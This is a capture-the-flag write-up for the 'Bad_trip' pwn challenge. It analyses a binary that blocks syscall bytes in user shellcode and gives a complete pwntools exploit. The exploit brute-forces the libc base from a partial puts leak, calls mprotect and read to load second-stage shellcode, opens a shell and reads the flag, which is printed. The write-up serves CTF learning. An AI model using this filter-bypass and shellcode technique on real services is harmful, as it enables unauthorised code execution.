https://ctftime.org/event/2222

# Bad_trip (PWN)

im giving you a leak, how cant you solve this. BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD TRIP

nc 172.210.129.230 1352

## Binary Analysis

- `main` @ `0x00101345`
    - maps a page @ `0x1337131000` with rwx
    - maps a large region @ `0x69696b6500` with rw
    - leaks the lower 32 bits of the `libc.so.6` symbol `puts`
    - reads your code into the first single page we mapped @ `0x1337131000`
    - removes w from the page
    - calls `filter`
        - if the filter returns non-zero `exit(-1)`
    - calls `exec`

- `filter` @ `0x00101282`
    - checks for the byte sequences `0f 05` and `cd 80`
        - these correspond to `syscall`, `int 0x80`
    - code also checks for `0f 04` but idk what this does

- `exec` @ `0x001011df`
    - clears a bunch of registers including `rsp`
    - jumps to `0x1337131000` / our code


Notably we can see that `bad_trip` is using PIE:

```
$ pwn checksec ./bad_trip 
[*] '/home/user/ctf/bad_trip/bad_trip'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Therefore we will have to determine the base of `libc.so.6` using the `puts` leak.

## Getting libc.so.6

We can see from the `Dockerfile` that the task is using `archlinux` btw:

```
FROM archlinux


RUN pacman -Sy
RUN pacman -S --noconfirm socat

EXPOSE 1352

RUN useradd ctf

WORKDIR /chal
COPY bad_trip /chal
COPY flag.txt /chal

USER ctf

CMD ["socat", "tcp-l:1352,reuseaddr,fork", "EXEC:./bad_trip"]
```

The version of `libc.so.6` I was able to extract from a running instance of this container had the following hash:

`fc4c52f3910ed57a088d19ab86c671358f5e917cd4e95b21fd08e4fd922c0aa2`

I did this by hacking `ret`'s `libc` command a bit as It assumes you want `libc.so.6` from an `apt` based distro currently:

https://github.com/rerrorctf/ret/blob/main/commands/libc.go

## Solution

1) Use the leak combined with a guess to guess the `libc.so.6` base address
1) Restore the stack so we can make function calls using the provided RW region `0x69696b6500`
2) Change the protections on `0x1337131000` so we can write more shellcode
3) Call `read` to read more shellcode - containing the syscall
4) Pivot to the new shellcode we read

```python
from pwn import *
import secrets

elf = ELF("./bad_trip", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)
try:
    p = remote("172.210.129.230", 1352)

    p.readuntil(b"start with ")
    leak = int(p.readline().decode(), 16)
    leak = 0x700000000000 | (secrets.randbelow(0x1000) << 32) | leak
    libc.address = leak - libc.sym["puts"]

    payload = b"\x90" * 50 # nops to overwrite
    payload += asm("mov rsp, 0x69696b6500") # new stack
    payload += asm("mov rdx, 7")
    payload += asm("mov rsi, 4096")
    payload += asm("movabs rdi, 0x1337131000")
    payload += asm(f"mov rax, 0x{libc.sym["mprotect"]:x}")
    payload += asm("call rax") # mprotect(0x1337131000, 4096, 7)
    payload += asm("mov rdx, 100")
    payload += asm("mov rsi, 0x1337131000")
    payload += asm("mov rdi, 0")
    payload += asm(f"mov rax, 0x{libc.sym["read"]:x}")
    payload += asm("call rax") # read(0, 0x1337131000, 100)
    payload += asm("movabs rax, 0x1337131000")
    payload += asm("jmp rax") # jmp 0x1337131000

    p.readuntil(b"code >> ")
    p.sendline(payload)

    p.sendline(asm(shellcraft.sh()))

    p.clean()

    p.sendline(b"/bin/cat flag.txt")

    print(p.readline().decode())

    p.interactive()
except:
    pass
```

To speed up the bruteforcing process I simply ran this bash script in 8 shells and waiting for one to hang on the shell:

```bash
#!/bin/bash

while true; do
  python3 go.py
done
```

In speaking to the admin it seems that the intended solve was to upload shellcode that would itself bruteforce these bits.

## Flag
`AKASEC{pr3f37CH3M_Li8C_4Ddr35532}`

smiley 2024/06/09
